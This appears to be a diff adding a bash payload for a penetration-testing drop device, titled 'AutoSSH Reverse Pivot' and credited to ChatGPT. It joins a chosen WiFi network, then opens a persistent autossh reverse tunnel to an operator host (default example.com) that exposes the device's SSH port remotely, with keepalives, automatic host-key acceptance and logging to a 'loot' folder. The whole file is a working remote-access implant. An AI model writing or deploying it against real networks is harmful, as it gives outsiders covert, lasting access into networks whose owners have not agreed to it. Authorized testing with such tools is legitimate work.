@@ -1,0 +1,103 @@
+#!/bin/bash
+# Title: AutoSSH Reverse Pivot
+# Description: Establishes a resilient reverse SSH tunnel for remote operator access with health checks and optional WiFi association.
+# Author: ChatGPT
+# Version: 1.0
+# Category: Remote-Access
+# Net Mode: WIFI_CLIENT
+#
+# LED State Descriptions
+# Magenta Solid  - configuring connectivity
+# Blue Blink     - attempting reverse tunnel
+# Green Solid    - tunnel active
+# Red Blink      - missing dependency or authentication failure
+#
+# Options
+AUTOSSH_HOST="${AUTOSSH_HOST:-example.com}"
+AUTOSSH_USER="${AUTOSSH_USER:-pager}"
+AUTOSSH_PORT="${AUTOSSH_PORT:-22}"
+REMOTE_PORT="${REMOTE_PORT:-2222}"
+LOCAL_PORT="${LOCAL_PORT:-22}"
+KEEPALIVE_INTERVAL="${KEEPALIVE_INTERVAL:-30}"
+AUTOSSH_KEY="${AUTOSSH_KEY:-/root/.ssh/id_rsa}"
+WIFI_INTERFACE="${WIFI_INTERFACE:-wlan0}"
+WIFI_SSID="${WIFI_SSID:-}"
+WIFI_PASSWORD="${WIFI_PASSWORD:-}"
+LOG_FILE="${LOG_FILE:-/root/loot/autossh-reverse-pivot/autossh.log}"
+
+_led() {
+    if command -v LED >/dev/null 2>&1; then
+        LED "$@"
+    else
+        echo "[LED:$*]"
+    fi
+}
+
+_netmode() {
+    if command -v NETMODE >/dev/null 2>&1; then
+        NETMODE "$@"
+    else
+        echo "NETMODE $* (command not available, skipping)"
+    fi
+}
+
+log() {
+    echo "[$(date --iso-8601=seconds)] $*" | tee -a "$LOG_FILE"
+}
+
+prepare_wifi() {
+    if [ -z "$WIFI_SSID" ]; then
+        return
+    fi
+    log "Attempting to associate with SSID $WIFI_SSID on $WIFI_INTERFACE"
+    if command -v nmcli >/dev/null 2>&1; then
+        nmcli dev wifi connect "$WIFI_SSID" password "$WIFI_PASSWORD" ifname "$WIFI_INTERFACE" >>"$LOG_FILE" 2>&1
+    elif command -v wpa_supplicant >/dev/null 2>&1; then
+        wpa_passphrase "$WIFI_SSID" "$WIFI_PASSWORD" >/tmp/pager-wpa.conf
+        wpa_supplicant -B -i "$WIFI_INTERFACE" -c /tmp/pager-wpa.conf >>"$LOG_FILE" 2>&1
+        udhcpc -i "$WIFI_INTERFACE" >>"$LOG_FILE" 2>&1
+    else
+        log "No WiFi association tool available; skipping"
+    fi
+}
+
+_led MAGENTA
+mkdir -p "$(dirname "$LOG_FILE")"
+touch "$LOG_FILE"
+_netmode WIFI_CLIENT
+prepare_wifi
+
+if ! command -v autossh >/dev/null 2>&1; then
+    log "autossh not installed"
+    _led FAIL
+    exit 1
+fi
+
+if [ ! -f "$AUTOSSH_KEY" ]; then
+    log "SSH key missing at $AUTOSSH_KEY"
+    _led FAIL
+    exit 1
+fi
+
+_led BLUE
+log "Starting reverse tunnel to $AUTOSSH_USER@$AUTOSSH_HOST:$AUTOSSH_PORT exposing local port $LOCAL_PORT on remote $REMOTE_PORT"
+AUTOSSH_GATETIME=0 AUTOSSH_POLL=60 AUTOSSH_PORT=0 autossh \
+    -M 0 -N \
+    -o "ServerAliveInterval=$KEEPALIVE_INTERVAL" \
+    -o "ServerAliveCountMax=3" \
+    -o "ExitOnForwardFailure=yes" \
+    -o "StrictHostKeyChecking=accept-new" \
+    -i "$AUTOSSH_KEY" \
+    -R "$REMOTE_PORT:localhost:$LOCAL_PORT" \
+    -p "$AUTOSSH_PORT" \
+    "$AUTOSSH_USER@$AUTOSSH_HOST" >>"$LOG_FILE" 2>&1 &
+
+sleep 5
+if pgrep -f "autossh .*${AUTOSSH_HOST}" >/dev/null 2>&1; then
+    log "Reverse tunnel established; monitor using 'pgrep -a autossh'"
+    _led GREEN
+else
+    log "autossh failed to start"
+    _led FAIL
+    exit 1
+fi
